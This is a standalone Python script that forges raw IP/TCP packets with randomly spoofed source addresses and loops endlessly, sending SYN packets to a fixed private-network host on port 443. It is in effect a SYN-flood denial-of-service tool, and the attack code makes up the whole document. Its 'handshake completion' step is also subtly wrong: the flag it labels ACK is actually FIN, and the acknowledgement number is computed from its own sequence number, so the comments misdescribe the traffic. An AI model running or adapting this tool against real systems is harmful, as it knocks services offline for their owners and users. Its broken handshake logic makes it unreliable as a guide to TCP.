import random
import socket
import struct
import time

# Compute the TCP checksum
def checksum(data):
	if len(data) % 2:
		data += b'\0' # pad with a null byte if odd number of bytes
	res = sum(struct.unpack("!%sH" % (len(data) // 2), data))
	res = (res >> 16) + (res & 0xffff)
	res += res >> 16
	return (~res) & 0xffff

def create_ip_header(src_ip, dst_ip):
	ip_ihl = 5                          # header length
	ip_ver = 4                          # IP version
	ip_tos = 0                          # type of service
	ip_tot_len = 20 + 20                # IP header + TCP header length
	ip_id = random.randint(0, 65535)    # unique id for reassembly
	ip_frag_off = 0                     # fragment offset
	ip_ttl = 64                         # time to live
	ip_proto = socket.IPPROTO_TCP       # protocol in payload
	ip_check = 0                        # initial checksum
	ip_saddr = socket.inet_aton(src_ip) # source address
	ip_daddr = socket.inet_aton(dst_ip) # destination address

	ip_ihl_ver = (ip_ver << 4) + ip_ihl # pack ihl and version into a single byte

	return struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                   	ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

def create_tcp_header(src_ip, dst_ip, src_port, dst_port, seq, ack_seq, syn=1, ack=0):
	doff = 5                                    # data offset
	flags = (syn << 1) + ack                    # flag byte with syn and ack
	window = socket.htons(5840)                 # window size
	check = 0                                   # set initial checksum
	urg_ptr = 0                                 # no urgent data

	tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq,
                         	doff << 4, flags, window, check, urg_ptr)

	source_address = socket.inet_aton(src_ip)
	dest_address = socket.inet_aton(dst_ip)
	placeholder = 0
	protocol = socket.IPPROTO_TCP
	tcp_length = len(tcp_header)

	pseudo_header = struct.pack('!4s4sBBH', source_address, dest_address,
                            	placeholder, protocol, tcp_length)
	psh = pseudo_header + tcp_header
	tcp_checksum = checksum(psh)

	tcp_header = struct.pack('!HHLLBBH', src_port, dst_port, seq, ack_seq,
                         	doff << 4, flags, window) + struct.pack('H', tcp_checksum) + struct.pack('!H', urg_ptr)

	return tcp_header

def send_raw_syn(dst_ip, dst_port, complete=False):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
		src_ip = f"192.168.68.{random.randint(65, 254)}"                        # generate spoofed source ip and port
		src_port = random.randint(1024, 65535)
		seq = random.randint(0, 4294967295)
		ack_seq = 0
		ip_header = create_ip_header(src_ip, dst_ip)                            # create the ip and tcp header
		tcp_header = create_tcp_header(src_ip, dst_ip, src_port, dst_port, seq, ack_seq, syn=1, ack=0)
		packet = ip_header + tcp_header
		s.sendto(packet, (dst_ip, 0))
		print(f"[SYN] Sent from {src_ip}:{src_port} to {dst_ip}:{dst_port}")            
		if complete:
			time.sleep(0.5)
			ack_seq = seq + 1
			seq += 1
			tcp_ack = create_tcp_header(src_ip, dst_ip, src_port, dst_port, seq, ack_seq, syn=0, ack=1)
			packet = create_ip_header(src_ip, dst_ip) + tcp_ack
			s.sendto(packet, (dst_ip, 0))
			print(f"[ACK] Sent ACK to complete handshake {src_ip}:{src_port} -> {dst_ip}:{dst_port}")

	except PermissionError:
		print("Run as root")
	except Exception as e:
		print(f"Error: {e}")

dst_ip = "192.168.68.63"
dst_port = 443

print(f"Starting packet sending to {dst_ip}:{dst_port}")

while True:
	try:
		mode = random.choice(["syn", "complete"])
		if mode == "syn":
			send_raw_syn(dst_ip, dst_port, complete=False)
		else:
			send_raw_syn(dst_ip, dst_port, complete=True)
		time.sleep(0.2)
	except KeyboardInterrupt:
		print("\n[!] Stopped by user.")
		break



